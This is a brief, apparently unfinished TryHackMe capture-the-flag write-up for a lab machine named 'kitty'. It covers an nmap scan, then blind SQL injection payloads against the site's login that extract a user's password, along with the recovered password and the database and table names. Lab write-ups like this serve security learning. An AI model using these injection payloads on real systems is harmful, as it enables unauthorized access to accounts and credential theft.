# #1 introduction
<img width="647" alt="image" src="https://github.com/Mate0r/tryhackme.com/assets/94843357/0b9b87b9-98fb-4b13-ae10-fbfac330dd87">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx kitty.thm
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- kitty.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# #3 user.txt

## HTTP (port 80)
kitty' AND 1=1#

kitty' AND password LIKE BINARY '%'

we add the binary cause LIKE is case insensitive
we will use kitty and password to connect to SSH

-> L0ng_Liv3_KittY

dbname : mywebsite

table: siteusers
fields: id,username,password,created_at


we
